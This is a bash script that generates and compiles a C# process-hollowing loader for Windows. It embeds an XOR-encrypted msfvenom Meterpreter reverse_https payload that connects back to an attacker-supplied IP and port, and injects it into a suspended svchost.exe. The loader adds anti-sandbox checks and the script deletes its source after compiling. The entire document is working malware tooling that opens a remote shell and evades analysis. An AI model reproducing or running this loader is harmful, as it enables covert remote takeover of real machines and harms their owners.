#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 ip port"
    exit 1
fi

ip="$1"
port="$2"

echo -e "\033[32m[+]\033[0m Created C# file"

charp_code=$(cat << 'EOT'
using System;
using System.Runtime.InteropServices;

namespace ProcessHollower
{
    class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int ProcessBasicInformation = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            {
                return;
            }
            var rand = new Random();
            uint dream = (uint)rand.Next(10000, 20000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                Console.WriteLine("Charles, get the rifle out. We're being fucked.");
                return;
            }
EOT
)

result=$(msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port -f csharp --encrypt xor --encrypt-key a 2>/dev/null)

charp_code_2=$(cat << 'EOT'
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'a');
            }
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, ProcessBasicInformation, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] baseAddressBytes = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrImageBaseAddress, baseAddressBytes, baseAddressBytes.Length, out nRead);
            IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, imageBaseAddress, data, data.Length, out nRead);
            uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
            uint entrypointRvaOffset = e_lfanew + 0x28;
            uint entrypointRva = BitConverter.ToUInt32(data, (int)entrypointRvaOffset);
            IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);
            WriteProcessMemory(hProcess, entrypointAddress, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);
        }
    }
}
EOT
)

echo "$charp_code" > rev.cs
echo "$result" >> rev.cs
echo "$charp_code_2" >>rev.cs

echo -e "\033[32m[+]\033[0m Creating Executable"

mcs rev.cs 1>/dev/null 2>/dev/null
rm rev.cs

echo -e "\033[32m[+]\033[0m Created!"